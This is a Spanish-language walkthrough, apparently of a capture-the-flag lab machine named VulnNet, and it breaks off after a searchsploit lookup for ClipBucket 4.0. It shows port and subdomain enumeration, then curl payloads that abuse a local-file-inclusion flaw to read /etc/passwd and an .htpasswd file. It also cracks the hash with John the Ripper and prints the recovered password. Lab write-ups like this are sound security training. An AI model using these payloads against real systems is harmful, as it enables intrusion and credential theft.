@@ -1,1 +1,197 @@
+#Vulnet walkthrough
 
+Comienzo por añadir la siguiente linea a mi archivo /etc/hosts
+
+10.130.149.47 vulnnet.thm
+
+Ahora comienzo la enumeración, con un de todos los puertos, y otro para hacer una enumeración básica y ver versiones.
+
+nmap -p- 10.130.149.47
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-21 16:31 CEST
+Nmap scan report for vulnnet.thm (10.130.149.47)
+Host is up (0.027s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 10.18 seconds
+
+nmap -sVC -p 22,80 10.130.149.47
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-21 16:32 CEST
+Nmap scan report for vulnnet.thm (10.130.149.47)
+Host is up (0.027s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
+|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
+|_  256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: VulnNet
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.72 seconds
+
+Antes de ver la web hago un escaneo, para enumerar posibles subdominios.
+
+ gobuster vhost -u http://vulnnet.thm -w /snap/seclists/current/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://vulnnet.thm
+[+] Method:          GET
+[+] Threads:         10
+[+] Wordlist:        /snap/seclists/current/Discovery/DNS/subdomains-top1million-5000.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: gc._msdcs.vulnnet.thm Status: 400 [Size: 424]
+Found: broadcast.vulnnet.thm Status: 401 [Size: 468]
+Progress: 4989 / 4990 (99.98%)
+===============================================================
+Finished
+===============================================================
+
+Agrego los dominios a mi /etc/hosts. gc._msdcs.vulnnet.thm posiblemente sea algo relacionado con AD.
+Ahora voy a ver la web alojada en el puerto 80. He encontrado un login, y un formulario de registro, al cual no puedo acceder.
+
+En el dominio broadcast.vulnnet.thm me lleva a un formulario de login, vuelvo a la web, a enumerar.
+
+dirsearch -u http://vulnnet.thm/
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/mksk/reports/http_vulnnet.thm/__26-05-21_16-50-44.txt
+
+Target: http://vulnnet.thm/
+
+[16:50:44] Starting: 
+[16:50:44] 301 -  307B  - /js  ->  http://vulnnet.thm/js/
+[16:50:46] 403 -  276B  - /.ht_wsr.txt
+[16:50:46] 403 -  276B  - /.htaccess.orig
+[16:50:46] 403 -  276B  - /.htaccess.bak1
+[16:50:46] 403 -  276B  - /.htaccess.sample
+[16:50:46] 403 -  276B  - /.htaccess.save
+[16:50:46] 403 -  276B  - /.htaccess_orig
+[16:50:46] 403 -  276B  - /.htaccess_extra
+[16:50:46] 403 -  276B  - /.htaccess_sc
+[16:50:46] 403 -  276B  - /.htaccessBAK
+[16:50:46] 403 -  276B  - /.htaccessOLD
+[16:50:46] 403 -  276B  - /.htaccessOLD2
+[16:50:46] 403 -  276B  - /.html
+[16:50:46] 403 -  276B  - /.htm
+[16:50:46] 403 -  276B  - /.htpasswd_test
+[16:50:46] 403 -  276B  - /.htpasswds
+[16:50:46] 403 -  276B  - /.httr-oauth
+[16:50:47] 403 -  276B  - /.php
+[16:50:55] 301 -  308B  - /css  ->  http://vulnnet.thm/css/
+[16:50:57] 301 -  310B  - /fonts  ->  http://vulnnet.thm/fonts/
+[16:50:58] 301 -  308B  - /img  ->  http://vulnnet.thm/img/
+[16:50:59] 200 -  505B  - /js/
+[16:50:59] 200 -  607B  - /LICENSE.txt
+[16:50:59] 200 -  911B  - /login.html
+[16:51:05] 403 -  276B  - /server-status
+[16:51:05] 403 -  276B  - /server-status/
+
+He descubierto varias subcarpetas, voy a comprobar si alguna tiene algo interesante.
+En la carpeta JS encuentro varios archivos con código, voy a comenzar a ver el más corto, index__d8338055.js.
+
+Una vez parseado, hay algo que me llama la atención, el parámetro referer que se pasa por la url. Hago un test para comprobar si hay algun tipo de vulnerabilidad.
+Tras varios intentos, encuentro un payload para LFI.
+
+curl "http://vulnnet.thm/index.php?referer=/etc/passwd"
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
+lightdm:x:106:113:Light Display Manager:/var/lib/lightdm:/bin/false
+whoopsie:x:107:117::/nonexistent:/bin/false
+kernoops:x:108:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+pulse:x:109:119:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+avahi:x:110:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
+mysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+	<script src="/js/index__7ed54732.js"></script>
+	<script src="/js/index__d8338055.js"></script>
+
+Voy a dejar de lado root por el momento, pero el usuario server-management me parece interesante.
+server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
+
+Ahora que tengo un user, intento enumerar algo que me de acceso, una clave ssh, pero sin éxito.
+
+
+Finalmente saco otras credenciales del archivo .htpasswd con este payload.
+curl "http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd"
+developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
+Seguramente serán credenciales para el portal de login en broadcast.vulnnet.thm. 
+
+El cifrado de la contraseña esta en md5crypt, lo paso a un archivo de texto y lo crackeo con john.
+
+john-the-ripper --wordlist=/home/mksk/wordlists/rockyou.txt hash.txt 
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-opencl"
+Use the "--format=md5crypt-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
+Will run 16 OpenMP threads
+Note: Passwords longer than 5 [worst case UTF-8] to 15 [ASCII] rejected
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+9972761drmfsls   (developers)     
+1g 0:00:00:01 DONE (2026-05-21 17:12) 0.7194g/s 1555Kp/s 1555Kc/s 1555KC/s =bfk;iiI..98889684
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+Ya tengo las credenciales: developers:9972761drmfsls
+
+Ahora voy a broadcast.vulnnet.thm para comprobar si funcionan. Consigo loguearme y veo una pantalla de Clipbucket, un CMS enfocado a video.
+Para averiguar mas cosas cojo el código fuente de la página y se lo paso a deepseek para que busque números de version, o lo reconozaca.
+
+Deepseek ha resaltado esta linea <!-- ClipBucket version 4.0 -->
+
+Compruebo si hay exploits conocidos en esta versión: 
+
+searchsploit Clipbucket 4.0
+---------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                        |  Path
+---------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ClipBucket < 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Injection                                   | php/webapps/44250.txt
+ClipBucket < 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Injection                                   | php/webapps/44250.txt
+---------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+Si que hay
